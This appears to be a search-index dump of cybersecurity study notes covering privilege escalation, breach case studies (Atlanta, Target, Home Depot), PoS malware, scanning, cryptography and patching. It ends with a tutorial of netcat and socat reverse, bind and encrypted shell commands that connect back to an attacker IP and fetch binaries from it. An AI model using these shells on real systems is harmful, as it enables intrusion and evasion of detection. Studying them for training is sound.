crontab file containing commands and instructions for the Cron daemon to execute.\n\n### How to View Active Cronjobs\n\nUse the command `cat /etc/crontab` to view what cron jobs are scheduled.\n\n- Always check manually, especially if LinEnum, or a similar script, does not find anything.\n\n### Format of a Cronjob\n\nCronjob exist in a certain format.\n\n- '#' = ID\n- m = Minute\n- h = Hour\n- dom = Day of the Month\n- mon = Month\n- dow = Day of the week\n- user = What user the command will run as\n- command = What command should be run\n\n### Exploit\n\nFrom the LinEnum scan, the file autoscript.sh, on user4's desktop is scheduled to run every five minutes.\n\n- Owned by root, meaning it will run with root privileges.\n  - The task then is to create a command that will return a shell and paste it in this file.\n\n## Exploit PATH Variable\n\nPATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs.\n\n- When the user runs any command in the terminal, it searches for executable files with the help of the PATH variable in response to commands.\n- We can re-write the PATH variable to a location of our choosing.\n  - SUID binary calls the system shell to run an executable.","n":0.026}}},{"i":12,"$":{"0":{"v":"Case Study","n":0.707}}},{"i":13,"$":{"0":{"v":"Ransomware","n":1},"1":{"v":"\n# Ransomware Overview\n\n- [ ] Learn what ransomware is.\n- [ ] Learn about the various methods ransomware uses to hold your data hostage.\n- [ ] Learn how users become targets of ransomware.\n\n- [ ] Learn what the most common types of ransomware are.\n- [ ] Learn about the various techniques they use to exploit users for money.\n\n\n- [ ] Define the timeline of the City of Atlanta Ransomware Breach\n- [ ] Learn about what actions were taken by the threat actors.\n- [ ] Learn what the impacts are from a Ransomware attack.\n---\n\n[Ransomware is a type of malware that infects computer systems, restricting users’ access to the infected systems. Ransomware variants have been observed for several years and often attempt to extort money from victims by displaying an on-screen alert. Typically, these alerts state that the user’s systems have been locked or that the user’s files have been encrypted. Users are told that unless a ransom is paid, access will not be restored. The ransom demanded from individuals varies greatly but is frequently $200–$400 dollars and must be paid in virtual currency, such as Bitcoin.](https://www.cisa.gov/uscert/ncas/alerts/TA16-091A)\n\n## Types of Ransomware\n\n### Crypto\n\n- Encrypt the sensitive files located on the victim's computer, such as documents, pictures, or videos to prevent access until ransom is paid.\n\n### Locker\n\n- Solely aims to lock victims out of their entire computer devices until ransom is paid.\n\n### Leakware/Doxware\n\n- Threaten to release footage from webcam, or any incriminating files that may be on a computer.\n  - May release to the public or specific people until ransom is paid.\n\n## Attack Vectors\n\nThere are many different ways a user can fall victim to a ransomware, though most can be avoided with proper security education and protocols.\n\n- Phishing\n- Remote Desktop Protocol (RDP)\n- Software vulnerabilities\n- Malicious Links\n\n## Prevention\n\nThe best way to prevent being a victim of ransomware is to keep a backup of all your data, keep your software up to date and use complex passwords for your network and computer.\n\n- Use an anti-virus or related security software, and stay vigilant in verifying any link or attachment you click on.\n\n### Backup\n\nHaving a full backup removes the threat of losing data.\n\n### Update Software & Passwords\n\nUpdated software and strong passwords is the first line of defense.\n\n### Antivirus\n\nSecurity software scanning for malicious attachments or changes to computer combats phishing.\n\n### Beware of Links\n\nBeyond emails, websites can be spoofed and visiting or clicking on links can download ransomware.\n\n## Examples\n\n[Infections can be devastating to an individual or organization, and recovery can be a difficult process that may require the services of a reputable data recovery specialist. Paying the ransom does not guarantee the encrypted files will be released; it only guarantees that the malicious actors receive the victim’s money, and in some cases, their banking information. In addition, decrypting files does not mean the malware infection itself has been removed.](https://www.cisa.gov/uscert/ncas/alerts/TA16-091A)\n\n### Why it is Effective\n\nThe authors of ransomware instill fear and panic into their victims, causing them to click on a link or pay a ransom, and users systems can become infected with additional malware.\n  \n- “Your computer was used to visit websites with illegal content. To unlock your computer, you must pay a $100 fine.”\n- “Your computer has been infected with a virus. Click here to resolve the issue.”\n- “All files on your computer have been encrypted.

March 22, 2018: Ransomware cyberattack dealt a widespread blow to the city of Atlanta, the state capital and home to the nation's busiest airport.\n  - Devices at City Hall shut down for five days.\n  - Law enforcement temporarily writing incident reports by hand and video.\n  - Stopping online or in-person payments of tickets, water bills, and business licenses, and renewals.\n2. Atlanta disabled the Wi-Fi at Hartsfield-Jackson Atlanta International Airport until April 2nd.\n3. In May, the city restored its online water bill payment system.\n4. In June, the court's online bill payment option and docket boards returned.\n\n### Vulnerabilities\n\nThere was no plan in place if an attack occurred.\n\n#### Operations During an Attack\n\nDespite the breach, Atlanta's 911 system and its emergency response was unaffected, and major utilities including water and sewer services continued.\n\n- Retained the manual processes and institutional knowledge needed to revert to traditional methods of service provision and had plans in place to keep doing business during the attack.\n- Did not understand the impact of the threat on all operations.\n\n#### Readiness of Systems\n\n- Lack of spending upgrading their infrastructure.\n- Large number of vulnerabilities logged in a January 2018 audit.\n  - Found 1,500 to 2,000 vulnerabilities in the city systems, and suggested that the number of vulnerabilities had so large that workers grew complacent.\n\n### Cost\n\n- The attack could cost taxpayers $17 million - up from earlier estimates of 2.7 million.\n- The latest cost estimate includes about $6 million in existing contracts for security services and software upgrades and 11 million in potential costs associated with the attack, including new desktops, laptops, smartphones and tablets.\n- This would mark one of the U.S.' costliest cyberattacks affecting a local government in 2018, despite city officials declining to pay the ransom demanding by the hackers.\n\n### Prevention\n\n- IT officials must know their network architecture, invest in email infrastructure, and remain vigilant at all levels, scrutinizing emails and their attachments and looking for browser vulnerabilities.\n- Multi-factor authentication is immensely valuable and segmentation is crucial.\n- State and local governments should have security zones segmented well within their own network.\n- Agencies should have a plan to do backups, to back up data regularly and make it secure.\n- Agencies should consult guidelines from the National Institute of Standards and Technology.\n\n### Moving Forward\n\n- Atlanta officials highlight the importance of protecting government data and information.\n- The city's approach to cybersecurity now rests on three pillars:\n  - Governance with compliance\n  - Vulnerability management\n  - Overall threat management\n- To limit the financial impact of an incident or breach, a cyber-insurance policy can serve as a road map.\n- An organization should step back from the smaller day-to-day tasks of enterprise-level IT management and cybersecurity to see the larger view.\n- Since becoming Atlanta's CIO in October 2018, Atlanta Chief Information Officer Gary Brantley has focused on building a continuity plan.\n- Wendi Whitmore, IBM's vice president of X-Force Threat Intelligence, said on this attack that running through drills can reveal critical weaknesses that allow cyberattacks to take place, as well as simple prevention efforts that can protect against extensive damage.\n","n":0.027}}},{"i":14,"$":{"0":{"v":"Phishing Scams","n":0.707},"1":{"v":"\n# Phishing Case Study: Google & Facebook\n\n- [ ] Review the timeline of events of the phishing scam.\n- [ ] Learn about what actions were taken by the threat actor and the companies.\n- [ ] Learn what the impacts of the attacks were.\n\n---\n\nScammers stole over $100 million from Facebook and Google in a creative way.

Compromised customer information included names, phone numbers, email and mailing addresses. In March 2015, Target reached a class-action settlement with affected consumers for $10 million (plus class-action attorney fees).](https://en.wikipedia.org/wiki/Target_Corporation)\n\n[In May 2016, Target settled with affected banks and credit unions for 39 million (class- action attorney fees), of which $19 million would be disbursed by a MasterCard program.](https://en.wikipedia.org/wiki/Target_Corporation#Customer_privacy) - Wikipedia\n\n### Situation\n\n> In November and December 2013, cyber thieves executed a successful cyber attack against Target, one of the largest retail companies in the United States. The attackers surreptitiously gained access to Target’s computer network, stole the financial and personal information of as many as 110 million Target customers, and then removed this sensitive information from Target’s network to a server in Eastern Europe.\n\n> John Mulligan, Target’s Executive Vice President and Chief Financial Officer, testified that his company “had in place multiple layers of protection, including firewalls, malware detection software, intrusion detection and prevention capabilities and data loss prevention tools.”38 He further stated that Target had been certified in September 2013 as compliant with the Payment Card Industry Data Security Standards (PCI-DSS), 39 which credit card companies require before allowing merchants to process credit and debit card payments.\n> -

Network context where attackers could reach critical assets?\n- No business process for to triage and analyze was defined.\n- The attack was ignored.\n\n#### More Alerts - No Linkage\n\n- More alerts with different areas of network.\n- Not correlated with other activity or in the context of the business or network.\n- Not enough visibility or context.\n- Still ignored.\n\n#### DOJ Notification - 40 million Records Gone\n\n- Too late\n- Nightmare business scenario\n\n### Target Attack Vulnerabilities\n\n- Attackers took advantage of weak security at a Target vendor, gaining a foothold in Target's inner network.\n  - Recon\n  - Weaponize\n  - Deliver\n- Target missed warnings from its anti-intrusion software that attackers were installing malware in its network.\n  - Deliver\n  - Exploit\n- Attackers took advantage of weak controls within Target's network and successfully maneuvered into the network's most sensitive areas.\n  -

Target noted that it reached a settlement in a class-action lawsuit brought by banks for about $58 million in May 2016.\n  - It also reached confidential settlements with major card issuers such as Visa, Mastercard, American Express, Discover as well as a number of individual banks.\n  - In total, Target has reported that it incurred about $292 million in expenses related to its data brach, about 90 million of which were offset by insurance.\n\n#### Prevention\n\n- Security logs and events\n- Network flow data\n- Vulnerability data\n- Network topology\n- Asset profile with business context, risk, ownership\n- Correlation rules\n- User behavioral analysis\n- Increased incident relevance\n- One incident case and analysis workflow\n- Integrated forensics - Rapid confirmation of attack\n- Massive reduction of window exposure\n\n## Watering Hole Attack\n\nWatering Hole\n: The attacker compromises a site likely to be visited by a particular target group, rather than attacking the target group directly.\n\n- July 2012, several high-profile institutions in the financial and technology sectors were victimized by a 'watering hole' attack.\n- July 13-15, 2012 - Customers of the bank are redirected to a malicious download site when they visit to do their online banking.\n- July 15-18, 2012 - Infections are detected at several companies.\n\n### Vulnerable Hosts Infected\n\nAttackers used different variants of the **Gh0st RAT** remote access Trojan horse, making detection very hard.\n\n#### Variant A\n\n- Exploited a known Microsoft vulnerability (CVE-2012-1889, 6/12/2012).\n- Path for all Microsoft operation systems was released on 7/10/2012.\n- Variant was not recognized by any AV vendor.\n\n#### Variant B\n\n- Exploited a known Java vulnerability (CVE-2012-1723, 6/16/2012).\n- Patch was released by Oracle 6/12/2012.\n- Variant was recognized by McAfee VSE as of July 2017, 2012.\n\n### Host Response\n\nAfter being infected, compromised hosts made contact with a remote command and control server in China.\n\n- Infected machines attempt to communicate with one of two Chinese command and control (C&C) servers, 58.64.155.57 and 58.64.155.59, on ports 53, 80, and 443.\n- If communications are successfully established, the C&C server gains complete, real-time control of a system on the protected network.\n- The malware, a remote access Trojan, allows a remote attack to access data, log system activity, capture key logs, take screenshots, activate the system's camera, and record from the system's microphone.\n  - The remote attacker can also drop additional downloads and programs on the controlled machine, and use it as a launching point for further attacks.\n\n### Risk of Delayed Response to Attack\n\nThe infected machine becomes the new launch point of deepening the penetration.\n\n- The infected machine 'legitimately' distributes more malware inside the enterprise network to gain a stronger foothold if detected.\n- The malware's first goal is to obtain privileged user identities, which it then uses to gain access to valuable assets inside the enterprise network.\n- Most attacks use ports and scans that typically are not executed from either the infected machines or user IDs.\n- After valuable assets are found, they are slowly exfiltrated to not raise any suspicion.\n\n## Apply Big Data to Security Intelligence and Threat Management\n\n### Collection, Storage, and Processing\n\n- Collection and integration\n- Size and speed\n- Enrichment and correlation\n\n### Analytics and Workflow\n\n- Visualization\n- Unstructured analysis\n- Learning and prediction\n- Customization\n- Sharing and export\n\n### Global Intelligence\n\n- Campaign identification\n- IP reputation covering attacker, industry, and region\n- Comparisons\n- Anomaly detection\n\n","n":0.031}}},{"i":16,"$":{"0":{"v":"POS","n":1},"1":{"v":"\n# Point of Sale Breach Overview\n\n- [ ] Learn what a Point of Sale (PoS) breach is.\n- [ ] Learn about PoS systems and their security standards.\n\n- [ ] Learn how malware makes its way onto PoS devices.\n- [ ] Learn about the different families of PoS malware.\n- [ ] Learn what happens to the stolen information.\n\n- [ ] Understand the timeline of events of the Point of Sale (POS) attack.\n- [ ] Learn about what actions were taken by the threat actors.\n- [ ] Learn what the impacts are from a POS attack.\n---\n\n[The main objective of point of sale (POS) breaches is to steal your 16-digit credit card numbers. Sixty percent of Point of Sale (POS) transactions are performed via credit card, which means big business for cyber-criminals (individual credit cards can be sold for up to 100 dollars apiece). The industries most affected by POS data breaches are usually restaurants, retail stores, grocery stores and hotels. The mainstream media tends to cover stories when the big brand retailers fall victim to these attacks, but data breaches actually happen more frequently to small and medium sized businesses because they are easier to compromise than the computer networks of large retailers. - Norton Internet Security](https://us.norton.com/internetsecurity-id-theft-pos-malware-data-breaches-and-why-they-keep-happening.html)\n\n## Point of Sale\n\n[The term Point of Sale (POS) is used to describe the technology used by a consumer to provide their payment information in exchange for a good or service. POS technology has actually been around for many years with the first cash register dating back to 1879 (Abell, 2009). However, it wasn't until the mid-70s that this technology was converted from a mechanical to an electrical form. - Wes Whitteker, 2014](https://www.giac.org/paper/gsec/35318/point-sale-pos-systems-security/121485)\n\n## PoS Security\n\nThe Payment Card Industry Data Security Standard (PCI DSS) is the main payment card industry information security standard. It was created in 2006 by the PCI security standards council (SSC).\n\n- Led by American Express, Discover Financial Services, JCB International, MasterCard, and Visa Inc.\n- The goal is to protect cardholder data and sensitive authentication data wherever it is processed, stored or transmitted.\n\n### PCI DSS - Security Controls & Processes for PCI DSS Requirements\n\nMerchants, service providers, and other entities involved with payment card processing must never store sensitive authentication data after authorization.\n\nThis includes the 3-or 4-digit security code printed on the front or back of a card, the data stored on a card's magnetic stripe or chip (also called Full Track Data) - and personal identification numbers (PIN) entered by the cardholder.\n\n1. Build and maintain a secure network and systems.\n2. Protect cardholder data.\n3. Maintain a vulnerability management program.\n4. Implement a strong access control measures.\n5. Regularly monitor and test networks.\n6. Maintain an information security policy.\n\n#### Requirements\n\n- Install and maintain a firewall configuration to protect cardholder data.\n- Do not use vendor-supplied defaults for system passwords and other security parameters.\n- Protect stored card cardholder data.\n- Encrypt transmission of cardholder data across open, public networks.\n- Use and regularly update antivirus software.\n- Develop and maintain secure systems and applications.\n- Restrict access to cardholder data by business need-to-know.\n- Assign a unique ID to each person with computer access.\n- Restrict physical access to cardholder data.\n- Track and monitor all access to network resources and cardholder data.\n- Regularly test security systems and processes.\n- Maintain a policy that addresses information security.\n\n#### Compliance is Not Enough\n\n[In 2018, cyber attacks increased by 32 percent in the first few months of the year compared to the same period in 2017.  Threats from criminals are constantly evolving and becoming more sophisticated. Being only PCI Compliant is not enough, and businesses need to take additional security measures to protect sensitive cardholder data and their payment technology investment. Here are a few ways businesses can protect their payment infrastructure:](https://blog.ingenico.us/blog/why-pci-compliance-isnt-enough)\n\nSemi-Integrated Payment Approach\n: Reduces the communication between the terminal and the electronic cash register (ECR) to non-sensitive commands. Sensitive data is isolated, encrypted and directly sent from the terminal to the intended processing hosts or gateway.\n\nPoint-to-Point Encryption (P2PE)\n: Helps protect card data while it is on the move during the payment process.\n\nTokenization\n: Helps protect the card data at rest. It replaces the sensitive information with a secure encrypted token protecting from cyber criminals when the data is at rest.\n\n- Current PCI standards do not allow businesses to save and store credit card details unless tokenized on PoS systems or databases after the transaction.\n\nMobile Device Management (MDM)\n: Many businesses use consumer-grade mobile devices to work with their POS systems. MDM is a type of security that allows businesses to remotely deploy and securely manage their mobile POS solutions.\n\nEmployee Education\n: Effective training of employees to be aware of possibilities regarding basic security protocols to prevent mistakes and protect business of threats.\n\n## PoS Malware\n\n[PoS systems require some sort of connection to a network in order to contact external credit card processors. This is necessary in order to validate credit card transactions. How this connection is provided may depend on the store in question. For small businesses, this may be provided via a cellular data connection. Sufficiently skilled and determined attackers can thus go after a business’s PoS terminals on a large scale and compromise the credit cards of thousands of users at a time. The same network connectivity can also be leveraged to help exfiltrate any stolen information.](http://www.trendmicro.com.ph/cloud-content/us/pdfs/security-intelligence/white-papers/wp-pos-system-breaches.pdf)\n\n- PoS malware specifically target the RAM to steal the un-encrypted information - a process called 'RAM scraping'.\n- Industry uses end-to-end encryption of sensitive payment data - which comes from the card's magnetic strip or chip - when it is transmitted, received or stored. Decryption only occurs in the PoS device's random-access memory (RAM), where it is processed.\n  - Most PoS run on Windows or Linux, making them small computers.\n  - Once inside, the PoS malware can select which data to steal and upload to a remote server... most PoS malware come equipped with backdoor and command-and-control features.\n\n### Types of Malware\n\nPoS malware is rarely used without the aid of other malware. These are the most common and readily available families of PoS malware.\n\nAlina\n: Scans the system's memory to check if the contents match regular expressions, which indicate the presence of card information that can be stolen.\n\nvSkimmer\n: If it does not find its server, it checks for the presence of a removable drive with the label 'KARTOXA007'. If this drive is found, it drops a file that contains any stolen information into it, allowing a method of offline data exfiltration.\n\nDexter\n: Steals various system information and installs a key-logger onto affected systems.\n\nFYSNA\n: Using the Tor network to communicate with its C&C server makes detection and investigation difficult by masking all of the network traffic made by the malware extremely difficult to analyze.\n\nDecebel\n: Checks if sand-boxing or analysis tools are present on a machine before running. This allows to make detection and analysis more difficult.\n\nBlackPOS\n: Uses FTP to upload information to a server of the attackers' choosing. Allows attackers to consolidate stolen data from multiple PoS terminals on a single server.\n\n### Where is the Data?\n\nCriminals sell the info to brokers who buy the payment card information in bulk and sell the information to 'carders' who use a carder website to obtain payment information which they will purchase pre-paid credit cards with.\n\n- Those credit cards will be used to buy gift cards, which are used to buy goods and sell for profit. The items are shipped to a re-shipper, making the transaction from end to end very difficult to follow.\n\n## Best Prevention Practices\n\n- Actively monitor POS network for changes.\n- Using compliant, best-of-class, end-to-end encryption around cardholder data.\n- Limiting the hosts that can communicate with POS systems.\n- Adopting chip-card enabled POS terminals.\n- Utilizing employee screening and training to minimize insider threats.\n- Training employees to immediately detect and report possible signs of tampering.\n\n## Case Study - Home Depot\n\n- The attack was completed using stolen credentials from one of the retailer's vendors.\n- Those credentials were used to obtain access to the network, privileges elevated and access to POS systems to record credit card details.\n- The malware infection went unnoticed for 5 months between April and September 2014.\n\n### Timeline\n\n1. Stolen credentials were used to obtain access to the network...\n2. Privileges were subsequently elevated.\n3. Access to the POS system was obtained and malware was downloaded to record credit card details.\n4. The malware infection went unnoticed for five months between April and September 2014.\n5. Home Depot began an investigation on September 2nd.\n6. On September 8th, 2014, Home Depot released a statement indicating that its payment card systems were breached.\n\n### Vulnerabilities\n\nThe attackers exploited a zero-day vulnerability in Windows, which allowed them to pivot from the vendor-specific environment to the Home Depot corporate environment.\n\n- Lack of regularly scheduled scan\n- Did not have proper configuration of the software, or hardware POS terminals and the lack of network segregation.\n- Credentials were not properly managed.\n- Lack of monitoring capabilities led to a 5 month delay.\n\n### Cost\n\n- 56 million payment cards stolen.\n- $19.5 million payout to customers that had been impacted by the breach, including credit monitoring services.\n- A minimum of $134.5 million to credit card companies and banks.\n- The total cost of the retail data breach is approximately $179 million, not including legal fees.\n- Expected total cost is close to $200 million.\n\n### Prevention\n\n- Chip-and-PIN card is embedded with security chip in addition to the traditional mag-stripe.\n- Vendors began promoting an alternative method to payment cards using mobile payment methods, like Apple Pay and Google Wallet.\n- Additional security was also provided by point-to-point (P2P) encryption.\n  - Risk still remains with P2P encryption if someone to install a credit card skimmer on the actual pin-pad - which is still occurring.\n","n":0.025}}},{"i":17,"$":{"0":{"v":"3rd Party","n":0.707},"1":{"v":"\n# 3rd Party Breach - Quest Diagnostics\n\n- [ ] Understand the timeline of events of the Quest Diagnostics breach.\n- [ ] Learn about what actions were taken by the threat actors.\n- [ ] Learn what the impacts are from a 3rd party attack.\n\n---\n\n- Quest is one of the largest providers of clinical laboratory testing services in the United States.\n- The sensitive data of 11.9 million patients was accessed, ranging from credit card numbers to bank account information and even social security numbers.\n\n## Timeline\n\n1.

All basic scanners can help identify active hosts and open ports, but some scanners are also able to provide additional information on the scanned hosts.\n\n## What is a Port?\n\nPort\n: Computer ports are the central docking point for the flow of information from a program or the internet to a device or another computer in the network and vice versa. It is the parking spot for the data to be exchanged through electronic, software, or programming-related mechanisms.\n\n- Port 20 (UDP) File Transfer Protocol (FTP) used for data transfer.\n- Port 22 (TCP) Secure Shell (SSH) protocol for secure logins, ftp, and port forwarding.\n- Port 53 (UDP) Domain Name System (DNS) which translates names to IP addresses.\n- Port 80 (TCP) World Wide Web HTTP.\n\n## Responses\n\nA port scanner is a simple computer program that checks all of those doors - start calling ports - and responds with one of three possible responses:\n\n- Open, Accepted\n- Closed, Not Listening\n- Filtered, Dropped, Blocked\n\n## Types of Scans\n\nPort scanning is a method of determining which ports on a network are open and could be receiving or sending data. It is also a process for sending packets to specific ports on a host and analyzing responses to identify vulnerabilities.\n\n- **Ping** - Simplest port scan sending ICMP echo requests to see who is responding.\n- **TCP/Half Open** - A popular, deceptive scan also known as SYN scan.\n  - It notes the connection and leaves the target hanging.\n- **TCP Connect** - Completing the TCP connection and makes it slower and noisier than half open.\n- **UDP** - Send an empty packet or a packet that has a different payload per port, and will only get a response if the port is closed.\n  - Faster than TCP but doesn't contain as much data.\n- **Stealth** - TCP scans are quieter than the other options and can get past firewalls.

Allows scientists and mathematicians to determine if a cryptographic algorithm is secure or not.\n\nCipher\n: An algorithm that encrypts a message.\n\nPlaintext\n: Basic text that is human readable.\n\nCiphertext\n: Plaintext gone through the cipher, which is basically the cipher has been applied to a plaintext and ciphertext is not humanly readable.\n\nEncryption\n: Process of transforming plaintext into ciphertext.\n\nDecryption\n: Process of transforming the ciphertext into a plaintext using the cipher.\n\n## Cryptographic Strength\n\n- Relies on math, not secrecy.\n- Ciphers that have stood the test of time are public algorithms.\n- Mono-alphabetic < Poly-alphabetic Ciphers\n- Modern ciphers use Modular math.\n- Exclusive Or (XOR) is the \"secret sauce\" behind modern encryption.\n    ![XOR table](https://img.phemex.com/wp-content/uploads/2021/07/19091947/xor.jpg)\n\n## Stream Cipher and Block Cipher\n\nStream Cipher\n: Encrypt or decrypt bit per bit.\n\nBlock Cipher\n: Encrypt or decrypt in blocks or several sizes, depending on the algorithm.\n\n---\n\n## Types of Cryptography\n\nThere are three primary types for modern encryption:\n\n- Symmetric\n- Asymmetric\n- Hash\n\n### Symmetric Encryption\n\n- Use the same key to encrypt and decrypt.\n- Security depends on keeping the key secret at all times.\n- Strengths include speed and cryptographic strength  per bit of key.\n- The bigger the key, the stronger the algorithm.\n- Key need to be shared using a secure, out-of-band method.\n- DES, Triples DES, AES are examples of symmetric encryption.\n\n### Asymmetric Encryption\n\n- Whitfield Diffie and Martin Hellman are pioneers of asymmetric encryption, created the Diffie-Hellman.\n- Uses two keys.\n- One key can be made public, called *public key*.

Examples of servers include web servers, mail servers, and file servers. Each of these servers provide resources to client devices, such as desktop computers, laptops, tablets, and smartphones. Most servers have a one-to-many relationship with clients, meaning a single server can provide resources to multiple clients at one time.\n\n### Common Type of Endpoint Attacks\n\nSpear Phishing\n: An email imitating a trusted source designed to target a specific person or department.\n\nWatering Hole\n: Malware placed on a site frequently visited by an employee or group of employees.\n\nAd Network Attacks\n: Used ad networks to place malware on a machine through ad software.\n\nIsland Hopping\n: Supply chain infiltration.\n","n":0.079}}},{"i":29,"$":{"0":{"v":"Patching","n":1},"1":{"v":"\n# Overview of Patching\n\n- [ ] Define patching.\n- [ ] Describe why patching is important to avoid cybersecurity events.\n\n- [ ] Describe how patching works.\n- [ ] Describe patch management best practices.\n\n---\n\n## Why Patching?\n\n- All operating systems (OS) require some type of patching.\n- **Patching is the fundamental and most important thing an organization can do to prevent malicious attacks.**\n\nPatch\n: A set of changes to a computer program or its supporting data designed to update, fix, or improve it. This includes fixing security vulnerabilities and other bugs, with such patches usually being called *bugfixes* or *bug fixes*, and improving the functionality, usability or performance.\n\n---\n\n## Windows Patching\n\n- Windows Updates allow for fixes to known flaws in Microsoft products and operating systems. The fixes, known as patches, are modifications to software and hardware to help improve performance, reliability, and security.\n- Microsoft releases patches in a monthly cycle, commonly referred to as \"Patch Tuesday,\" the second Tuesday of every month.\n\n### Types of Updates for Windows\n\nSecurity Updates\n: Security updates for Windows work to protect against new and ongoing threats. They are classified as Critical, Important, Moderate, Low, or non-rated.\n\nCritical Updates\n: These are high priority updates. When these are released, they need to be updated as soon as possible. It is recommended to have these set as automatic.\n\nSoftware Updates\n: Software updates are not critical. They often expand features and improve the reliability of the software.\n\nService Packs\n: These are roll-ups, or a compilation, of all previous updates to ensure that you are up to date on all of the patches since the release of the product up to a particular date. If your system is behind on updates, then service packs bring your system up to date.\n\n### Windows Application Patching\n\n- Un-patched software, especially if a widely used app like Adobe Flash or Internet Explorer, can be a magnet for malware and viruses.\n- 87% of the vulnerabilities found in the top 50 programs affected third-party programs such as Adobe Flash Player and Reader, Java, Skype, various media players and others outside the Microsoft ecosystem.

The syntax for starting a netcat listener using Linux:|#reverse-shell-example]] `nc -lvnp <PORT>`\n\n- `-l` to tell netcat that this will be a listener\n- `-v` to request a verbose output\n- `-n` tells netcat not to resolve host names or use DNS\n- `-p` indicates the port specification will follow\n\nAny port could be used as long there is not a service already using it. If you choose to use a port below 1024, you will need `sudo` to start the listener.\n\n- A good idea to use well-known port numbers (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.\n\nFor [[bind shells|#bind-shell-example]], we assume there is already a listener waiting for us on a chosen port of the target. All we have to do is connect with the syntax: `nc <TARGET-IP> <CHOSEN-PORT>`.\n\n- We use netcat to make an outbound connection to the target on our chosen port.\n\n#### Netcat Shell Stabilization\n\nThese shells are very unstable by default. Pressing CTRL+C kills the whole session and are non-interactive. There are ways to stabilize netcat shells on Linux systems. Meanwhile, Windows reverse shells tend to be significantly difficult.\n\n##### Python\n\nAlmost every Linux distribution will have Python installed by default.\n\n1. `python -c 'import pty;pty.spawn(\"/bin/bash\")'` uses Python to spawn a better featured bash shell. Note that some targets may need the version of Python specified such as `python2` or `python3` as required.\n2. `export TERM=xterm` will give us access to term commands such as `clear`.\n3. Finally background the shell using CTRL+Z. Back in our own terminal, we can use `stty raw -echo; fg` to allow us to turn off our own terminal echo (gives access to tab completions, the arrow keys, and CTRL+C to kill processes). It then foregrounds the shell and completing the process.\n\n![python](https://i.imgur.com/bQnFz1T.png)\n\nIf the shell dies, any input in your own terminal will not be visible (result of having disabled terminal echo). Type `reset` and enter to fix this.\n\n##### rlwrap\n\nrlwrap is a program gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. However, some manual stabilization must still be utilized to use CTRL+C inside the shell. rlwrap is not installed by default on Kali and can be installed with: `sudo apt install rlwrap`.\n\nTo use rlwrap listener: `rlwrap nc -lvnp <PORT>`\n\n- 'rlwrap' provides a much more fully featured shell. This technique is useful with Windows shells which are difficult to stabilize.\n  - With Linux target, it is possible to completely stabilize with the same trick before: background the shell with CTRL+Z, then use `stty raw -echo; fg` to stabilize and re-enter the shell.\n\n##### Socat Stable\n\nThe third easy way to stabilize a shell is initialize a netcat shell as a stepping stone to a full featured socat shell. This technique is limited to Linux targets, as Socat shells on Windows will be no more stable than a netcat shell.\n\n1. First transfer a socat static compiled binary (a version of the program compiled to have no dependencies) to the target machine. A common way to achieve this would be use web server on the attacking machine inside the directory containing socat binary (`sudo python3 -m http.server 80`).\n2. On the target machine, use the netcat shell to download the file with `wget <LOCAL-IP>/socat -O /tmp/socat` for Linux. On Windows machine CLI environment with Powershell: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe`.\n\n##### Change Terminal tty Size\n\nMust be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.\n\n1. Open another terminal and run `stty -a`. This will give a large stream of output.\n2. In the reverse/bind shell, type `stty rows <number>` and `stty cols <number>`.\n3. Input the numbers returned from running the command in own terminal. This will change the width and height of the terminal to allow programs such as text editors do display information to be accurate and correctly open.\n\n### Socat\n\nLike netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. However, the two big catches are:\n\n1. The syntax is more difficult\n2. Netcat is installed on virtually every Linux distribution by default. Socat is rarely installed by default.\n\n\nBoth Socat and Netcat have .exe versions for use on Windows.\n\n#### Socat Reverse Shells\n\nSocat is a connector between two points similar to the portal gun from the Portal games.\n\nThe syntax for a basic reverse shell listener in socat: `socat TCP-L:<PORT> -`. This will work on either Linux or Windows and is equivalent to `nc -lvnp <PORT>`.\n\nOn Windows use to connect back: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`. The pipes option is used to force powershell or cmd.exe to use Unix style standard input and output.\n\nThe equivalent for Linux target: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:\"bash -li\"`.\n\n#### Socat Bind Shells\n\nOn a Linux target: `socat TCP-L:<PORT> EXEC:\"bash -li\"`.\n\nOn a Windows target: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`.\n\nRegardless of the target, we use `socat TCP:<TARGET-IP>:<TARGET-PORT> -` on the attacking machine to connect to the waiting listener.\n\n- For a fully stable Linux tty reverse shell: `socat TCP-L:<PORT> FILE:'tty',raw,echo=0`\n- To connect to the listener: `socat TCP:<attacker-ip>:<attacker-port> EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane`.\n  - `EXEC:\"bash -li\"` creates an interactive bash session with the arguments: pty, stderr, sigint, setsid, and sane.\n    - `pty` allocates a pseudo-terminal on the target - part of the stabilization process.\n    - `stderr` makes sure that any error messages get shown in the shell (often a problem in non-interactive shells).\n    - `sigint` passes any CTRL+C commands through into the sub-process, allowing us to kill commands inside the shell.\n    - `setsid` creates the process in a new session.\n    - `sane` stabilizes the terminal, attempting to 'normalize' it.\n\n#### Socat Encrypted Shells\n\nSocat is capable of creating encrypted shells - both bind and reverse. Encrypted shells cannot be spied on unless you have the decryption key and are often able to bypass an IDS as a result.\n\n1. Generate a certificate in order to use encrypted shells on our attacking machine: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`. This command creates a 2048 bit RSA key with a matching cert file, self-signed, and valid for just under a year. It will ask to fill information about the certificate and can be let blank, or filled randomly.\n2. Now need to merge the two files into a single `.pem` file: `cat shell.key shell.crt > shell.pem`.\n3. Set up our reverse shell listener with `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0`. This opens up an OPENSSL listener using the generated certificate and `verify=0` tells the connection to not bother trying to validate our certificate has been properly signed by a recognized authority.\n   - The certificate must be used on whichever device is listening.\n4. Connect back with `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`.\n\nThe same technique would apply for a bind shell.\n\n- Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`\n- Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0`\n### Metasploit -- 